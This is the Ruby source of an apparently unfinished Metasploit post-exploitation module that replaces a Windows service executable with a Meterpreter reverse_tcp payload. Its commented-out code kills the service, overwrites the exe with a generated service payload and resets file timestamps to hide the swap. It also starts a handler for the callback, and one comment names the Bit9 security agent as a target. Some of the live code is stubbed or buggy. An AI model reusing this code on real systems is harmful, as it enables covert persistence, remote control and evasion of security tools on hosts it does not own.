#
# Meterpreter script that kills a process (if nec) and deletes,
# renames, backs up, and/or REPLACES it (with a service-enabled payload)
#
#by kernelsmith (kernelsmith+\x40+kernelsmith+\.com)

# TODO:  Check if I'm the owner of the service, and the exe?  sc query?

require 'msf/core'
require 'rex'
require 'rex/post/meterpreter/extensions/stdapi/railgun/railgun'

class Metasploit3 < Msf::Post

	include Rex::Post::Meterpreter::Extensions::Stdapi::Railgun

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Replace a service',
				'Description'   => %q{ This module will replace a service executable with a payload},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'Joshua Smith <kernelsmith[at]kernelsmith.com>'],
				'Version'       => '$Revision: 11566 $',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))
		register_options(
			[
				# OptString  - Multi-byte character string
				# OptBool    - Boolean true or false indication
				# OptPort    - TCP/UDP service port
				# OptAddress - IP address or hostname
				# OptPath    - Path name on disk
				# OptInt     - An integer value
				# OptEnum    - Select from a set of valid values
				# OptAddressRange - A subnet or range of addresses
				# OptSession - A session identifier
				#-----------------------------------------------------------------------
				OptString.new('KEYNAME', [ false, 'Key name of the target service', ""]),
				OptString.new('DISPLAYNAME' , [ false, 'Display name of the target service' , ""]),
				OptString.new('BACKUP' , [ false, 'Where to put a backup of the target service exe' , 'C:\\backup.exe']),
				OptString.new('UPLOAD' , [false, 'What payload to upload', 'windows/meterpreter/reverse_tcp']),
				OptPort.new('LPORT' , [ false, 'Port to which to connect back (rev payloads)' , 4444]),
				OptAddress.new('LHOST' , [ false, 'Host to which to connect back (rev payloads)' , '127.0.0.1']),
				OptBool.new('CHECKONLY' , [ true, 'Only check for the service, do not make changes' , false]),
				OptBool.new('LISTONLY' , [ true, 'Only list available services, do not make changes' , false]),
				OptBool.new('DELETE' , [ true, 'Do not backup service exe, just delete it' , false]),
				OptBool.new('VERBOSE' , [ false, 'show debug info' , false]),
				OptString.new('EXCHANGE' , [false, 'Instead of uploading a payload, replace the target service exe with this exe, already on the target host', 'C:\\']),
#				OptBool.new('VERBOSE' , [ false, 'Be verbose' , false]),
#				OptBool.new('DOWNLOAD' , [ false, 'Download the service exe for template use' , false]),
#				OptPath.new('TEMPLATE' , [ false, 'Use this file as a template' , "data/templates/template_x86_windows_svc.exe"]),
			], self.class)
		@scm_handle = nil
		
		#
		# -- use services mixin dumbass
		#
	end

	def get_possibilities(session)
		return "these are possibilities"
	end

	def good_idea?
		return true
	end

	def get_processes
		print_status "Getting processes..."
	end

	def rail_error (status_hash)
		# status_hash is a hash returned by railgun
		# try to handle some common windows error codes
		msg = ""
		err = status_hash['GetLastError']
		print_error "Railgun reported an error:  #{err}"
		print_line "The actual hash reported back from the function call was:"
		print_line "#{status_hash.inspect}"
		# check common errors
		possible_errs =   Array.[]("ERROR_INSUFFICIENT_BUFFER", 
			"ERROR_ACCESS_DENIED",
			"ERROR_INVALID_SERVICENAME",
			"ERROR_SERVICE_DISABLED",
			"ERROR_SERVICE_NOT_ACTIVE",
			"ERROR_INCOMPATIBLE_SERVICE_PRIVILEGE",
			"ERROR_FAILED_SERVICE_CONTROLLER_CONNECT",
			"ERROR_SERVICE_DOES_NOT_EXIST",
			"ERROR_SERVICE_DATABASE_LOCKED"
		)
		possible_errs.each do |e| 
			if err == session.railgun.const(e)
				# then we recognize this error
				msg << "You're error might be:  #{e}\n"
			end
		end
		msg << "For common error codes recognized by railgun,\n
			check lib/rex/post/meterpreter/extensions/stdapi/railgun/api_constants.rb\n
			Otherise consult http://msdn.microsoft.com/en-us/library/ms681381(VS.85).aspx"
		return msg
	end

	def service_get_display_name (session,keyname)
		print_status "Running GetServiceDisplayNameA on #{keyname}" if @verbose
		hSCManager = scm_open if !@scm_handle
		status = session.railgun.advapi32.GetServiceDisplayNameA(hSCManager,keyname,260,260)
		print_line "#{status.inspect}" if @verbose
		if status['GetLastError'] == session.railgun.const("NO_ERROR")
			print_status "Displayname is #{status['lpDisplayName']}" if @verbose
			return status['lpDisplayName']
		else
			print_error "#{rail_error(session,status)}"
			return nil
		end
	end

	def service_get_key_name(session,displayname)
		print_status "Running GetServiceKeyNameA on #{displayname}" if @verbose
		hSCManager = scm_open if !@scm_handle
		status = session.railgun.advapi32.GetServiceKeyNameA(hSCManager,displayname,260,260)
		print_line "#{status.inspect}" if @verbose
		if status['GetLastError'] == session.railgun.const("NO_ERROR")
			print_status "Keyname is #{status['lpServiceName']}" if @verbose
			return status['lpServiceName']
		else
			print_error "#{rail_error(session,status)}"
			return nil
		end
	end

	def service_get_correlated_names(session,name)
		#  IN: meterpreter session, name to check
		# OUT: array[keyname,displayname] or nil

		displayname = service_get_display_name(session,name)
		# if that worked, keyname was passed in
		return [name,displayname] if displayname
		keyname = service_get_key_name(session,name)
		# if that worked, displayname was passed in
		return [keyname,name] if keyname
		# otherwise
		return nil
	end

	def add_railgun_functions(session)
		# Add some railgun functions
		print_status "Adding GetServiceKeyNameA to railgun" if @verbose
		session.railgun.add_function('advapi32', 'GetServiceKeyNameA','BOOL',[
			["DWORD","hSCManager","in"],
			["PCHAR","lpDisplayName","in"],
			["PCHAR","lpServiceName","out"],
			["PDWORD","lpcchBuffer","inout"],
		])
		print_status "Adding GetServiceDisplayNameA to railgun" if @verbose
		session.railgun.add_function('advapi32', 'GetServiceDisplayNameA','BOOL',[
			["DWORD","hSCManager","in"], 
			["PCHAR","lpServiceName","in"], 
			["PCHAR","lpDisplayName","out"], 
			["PDWORD","lpcchBuffer","inout"], 
		])
	end

	def run
		print_status("Running against session #{datastore['SESSION']}")
		if datastore['VERBOSE']
			print_status "Being verbose..."
			@verbose = true
		end
		
		# open a handle to the windows service control manager
		@scm_handle = scm_open(session)

		if datastore['CHECKONLY']
			print_status "Checking #{datastore['KEYNAME']}"
		end

		if datastore['LISTONLY']
			print_status "LISTING..."
		end
		@scm_handle = !scm_close(session,@scm_handle) if @scm_handle
	end

	private
	def scm_open(session)
		# call railgun to connect to the SCM
		# railgun already has OpenSCManagerA, no need to add it
		print_status "Connecting to service manager" if @verbose
		status = session.railgun.advapi32.OpenSCManagerA(nil,nil,"SC_MANAGER_ENUMERATE_SERVICE")
		if status['GetLastError'] == session.railgun.const("NO_ERROR")
			print_status "Successfully connected to the service manager" if @verbose
			return status['return'] # return the handle
		else
			print_error "#{rail_error(session,status)}"
			return nil
		end
	end
	def scm_close(session,hSCObject)
		# "DWORD", "hSCObject", "in"
		status = session.railgun.advapi32.CloseServiceHandle(hSCObject)
		if status['GetLastError'] == session.railgun.const("NO_ERROR")
			print_status "Closed the service manager"
			print_status "#{status.inspect}" if @verbose
			return true
		else
			print_error "Couldn't close service manager\n#{rail_error(session,status)}"
			return false
		end
	end
end

#
# Default parameters
#
#rhost = Rex::Socket.source_address("1.2.3.4")
# change working dir, add error handling
#workingdir = session.fs.file.expand_path("%ProgramFiles%")+"\\Bit9\\Parity Agent\\"
#service = "Parity Agent"
#file = "parity.exe"
#$kill = true

#	when "-h"
#		print_line("\n#{myname} - Replace a service with a payload\n" + @@exec_opts.usage)
#		print_line("NOTES:\n    -d won't work until Msf::Util::EXE.to_win32pe_service\n" +
#			"        supports arbitrary templates like to_win32pe does")
#		print_line("    -t will work if the template is specifically prepared\n" +
#			"        See lib/msf/util/exe.rb")
#		print_line("EXAMPLES: \n    #{myname} -l\n" +
#			"    #{myname} -ch -s wmiapsrv\n" +
#			"    #{myname} -b C:\\\\backup.exe -s wmiapsrv " +
#			"-u windows/meterpreter/reverse_tcp -r 10.1.1.1 -p 443\n" +
#			"    #{myname} -u windows/meterpreter/reverse_tcp " +
#			"-r 192.168.1.1 -p 1001 -s wmiapsrv\n" +
#			"    #{myname} -b C:\\\\backup.exe -s wmiapsrv -x " +
#			"C:\\\\WINDOWS\\\\System32\\\\alg.exe")
#		raise Rex::Script::Completed
#	when "-x"
#		replace = true
#		dummyfile = val || session.fs.file.expand_path("%SystemRoot%")+"\\System32\\alg.exe"
#	when "-u"
#		upload = true
#		payload = val
#	when "-r"
#		rhost = val || Rex::Socket.source_address("1.2.3.4")
#    when "-p"
#		rport = val.to_i
#	when "*"
#		print_line(@@exec_opts.usage) 
#	end
#end

#class ProcHash < Hash
#	attr_accessor :os
#	def initialize
#		super
#		# default os to Windows XP, @os is here in case it's needed, don't think it is tho
#		@os = "Windows XP"
#	end
#
#	def is_service?
#	end
#
#	def service_registered?
#	end
#	
#	def service_running?
#	end
#
#	def service_autostart?
#	end
#
#	def service_status
#	end
#
#	def service_correlate_names
#		# depenent on ['name']
		# get and store the displayname and the keyname
#		print_status("Correlating windows service image, key, and display names") if @verbose
#		self['displayname'] = self.getServiceDisplayName	
#		self['keyname'] = self.getServiceKeyName
#	end

#	def start_service(session, kname)
#		# check os version? in case win2k etc doesn't have sc, microsoft says they all have it
#		results = ""
#		print_status("Setting #{kname} to auto start on reboot and trying to start it")
#		results = run_cmd(session, "cmd.exe /c sc config #{kname} start= auto")
#		print_status("Results:  #{results}")
#		results = run_cmd(session, "cmd.exe /c sc start #{kname}")
#		print_status("Results:  #{results}")
#		results
#	end

#def run_cmd(session, cmd)
#	results=""
#	print_status("Executing #{cmd}") if @verbose
#	r = session.sys.process.execute("#{cmd}", nil, {'Hidden' => 'true', 'Channelized' => true})
#	while(d = r.channel.read)
#		results << d
#	end
#	r.channel.close
#	r.close
#	print_line("Results:\n#{results}") if @verbose
#	results
#end

#def check_service_status(session, kname)
	# Windows seems inconsistent whether it does or does not require .exe 
	# so we check for .exe and try it both w/ and w/o .exe
#	kname2=kname # need to dup here?
#	goodname=kname # default to kname being the good name
#	if kname =~ /.exe$/i #end of string, and case insensitive
		#kname does have an exe on the end
#		kname2 = kname.chomp(".exe") # rip off the exe
#	else
		#kname doesn't have an exe on the end, let's add one
#		kname2 = kname+".exe"
#	end
#	results=''
#	results=run_cmd(session, "cmd.exe /c sc query #{kname}")
#	if results =~ /FAILED/
		# try again with kname2
#		results=run_cmd(session, "cmd.exe /c sc query #{kname2}")
#		goodname=kname2 #set goodname to kname2 cuz kname didn't work
#	end
#	return nil if results =~ /FAILED/
#	return goodname
#end

#def check_service_config(session, kname)
#	results = ""
#	results=run_cmd(session, "cmd.exe /c sc qc #{kname}")
#	return nil if results =~ /FAILED/	
#	return results
#end

#def get_proc_info(session, proc)
#	print_status("Gathering process info on running processes,")
#	print_status("	I only grab the first one that regex/insensitive matches " +
#		"#{proc}")
#	session.sys.process.get_processes().each do |m|
		#Returns an array of processes with hash objects that have keys for 
		#    ‘pid’, ‘name’, and ‘path’.
		#    {"pid"=>4076, 
		#    "parentid"=>948, 
		#    "name"=>"cmd.exe", 
		#    "path"=>"C:\\WINDOWS\\System32\\cmd.exe", 
		#    "session"=>0, 
		#    "user"=>"NT AUTHORITY\\SYSTEM", 
		#    "arch"=>"x86"}
#		if ( m['name'] =~ /#{proc}/i ) # case insensitive
			# ok, we found the process, let's figure out the windows 
			#     key name & display name
#			m = correlate_names(session,m) 
#			print_status("Found your process:\n	#{m.inspect}")
#			return m # break out of the each loop so we only get one 
						#    hash, not an array of hashes
#		end # end if
#	end # end do block
	# otherwise service not found
#	print_status("I didn't find your service, maybe it's just not running, " +
#		"let me check")
#	goodname = check_service_status(session, proc) 
#	raise RuntimeError, "Awww shiz, I can't find any running or stopped " +
#		"process matching #{proc}" if not goodname
#	print_status("Cool, #{goodname} is a registered service, it's just NOT " +
#		"RUNNING, but I can deal with that...")
	
	# otherwise the service isn't started, but it does exist, so lets run with it
	# and in this case we won't have to kill the process as it's not running
#	$kill = false
	# TODO:  Instantiate a full process hash like get_processes.each, fake it for now
#	m = {}
#	m['name'] = goodname # set the name to the name that actually worked
		# ok, let's figure out the windows service key name & display name
#		h = correlate_names(session,m)
#		h['path']= get_image_path(session, h['keyname'])
#		print_status("OK, we're using this unstarted service:\n	#{h.inspect}")
#		return h # we gots our stuff
#end # end def get_proc_info

#if checkonly
#	info=get_proc_info(session, service)
#	print_status("RESULTS:  Check Succeeded, I can try this on:\n#{info.inspect}")
#end

#def setmace(session,file2set,macehash)
#	print_status("Resetting MACE attributes on #{file2set}")
#	session.core.use("priv")
#	suckit=session.priv.fs.set_file_mace(file2set, macehash['Modified'], macehash['Accessed'], macehash['Created'], macehash['Entry Modified'])
#	raise RuntimeError, "Unable to set MACE" if not suckit
#end

# Since service is often restarted by the windows service manager in 
#   about 1 second, let's get some stuff done before we kill the process

# TODO: check if running as system, otherwise auto migrate?
# if (not simple.session.auth_user)

# get process info
# {"pid"=>4076, "parentid"=>948, "name"=>"cmd.exe", "path"=>"C:\\cmd.exe", 
#    "user"=>"NT AUTHORITY\\SYSTEM"}
#prochash = get_proc_info(session, service)
# get MACE attributes for actual exe
#session.core.use("priv")
#print_status("Grabbing the MACE attributes for the original exe")
#originalMACE=session.priv.fs.get_file_mace(prochash['path'])
#raise RuntimeError, "Unable to set MACE" if not originalMACE

#if download
	# Download exe to use as a template, make sure we can do this before 
	#	service is stopped
#	template = "data/templates/downloadedtemplate.exe"
#	print_status("Downloading #{prochash['path']}")
#	session.fs.file.download_file("#{template}", prochash['path'])
#	print_status(" - #{prochash['path']} downloaded as #{template}")
#end # end download prep

#if upload
	# Build out the exe payload.
#	print_status("Generating executable payload using optional template " +
#		"(#{template}) to replace #{prochash[path]}")
#	pay = session.framework.payloads.create("#{payload}")
#	pay.datastore['LHOST'] = rhost
#	pay.datastore['LPORT'] = rport
#	raw  = pay.generate
	#exe = Msf::Util::EXE.to_win32pe_service(session.framework, raw, 
	#	{:servicename => prochash['name'], :template => "#{template}"})
#	exe = Msf::Util::EXE.to_win32pe_service(session.framework, raw)
	#exe = Msf::Util::EXE.to_win32pe(session.framework, raw, {:template => template})
#end # end upload prep

#
# Finally, let's start the killing, if we should
#
#if $kill
#	print_status("Killing off #{prochash['name']}...")
#	session.sys.process.kill(prochash['pid'])
#end

#
# Backup/Delete/Replace/Upload
#

#if backup
	# Create a backup of the original exe.
#	print_status("Renaming (moving) #{prochash['path']} to #{backupfile}")
#	run_cmd(session,"cmd.exe /c move /y #{prochash['path']} #{backupfile}")
	# Set the MACE attributes on backupfile back to the original, you don't 
	#    really need this
	#setmace(session, "#{backupfile}", originalMACE) 
#end # end backup

#if delete
#	print_status("Deleting #{prochash['path']}")
#	run_cmd(session,"cmd.exe /c del \"#{prochash['path']}\"")
#end # end delete
	
#if replace
#	print_status("Replacing #{prochash['path']} with #{dummyfile}")
#	cmd = "cmd.exe /c copy /y \"#{dummyfile}\" \"#{prochash['path']}\""
#	print_status("Executing #{cmd}")
#	session.sys.process.execute("#{cmd}" ,nil,{'Hidden' => true,'UseTokenThread' => true})
	# Reset MACE attribs
#	setmace(session, prochash['path'], originalMACE)
#	start_service(session, prochash['keyname'])
#elsif upload
	# Replace the file with our previously created exe
#	print_status("Uploading EXE payload as #{prochash['path']}")
#	fd = session.fs.file.new(prochash['path'], "wb")
#	raise RuntimeError, "Unable to open file for writing" if not fd
#	fd.write(exe)
#	fd.close
	# Reset MACE attributes
#	setmace(session, prochash['path'], originalMACE)
#	print_status("I'm assuming you need a handler so, starting another "+
#		"handler to handle the callback...")
#	print_status("You should get a session as soon as the windows service " +
#		"manager restarts \"#{prochash['name']}\" or we start it manually")

	# Our handler to recieve the callback.
#	handler = session.framework.exploits.create("multi/handler")
#	handler.datastore['PAYLOAD'] = payload
#	handler.datastore['LHOST']   = rhost
#	handler.datastore['LPORT']   = rport
#	handler.datastore['ExitOnSession'] = false
#	handler.exploit_simple(
#		'Payload'        => handler.datastore['PAYLOAD'],
#		'RunAsJob'       => true
#	)
	#print_status("Forcibly restarting the effected service")
#	start_service(session, prochash['keyname'])
#		print_status("You can background this session and sessions -l to check")
#end # end replace/upload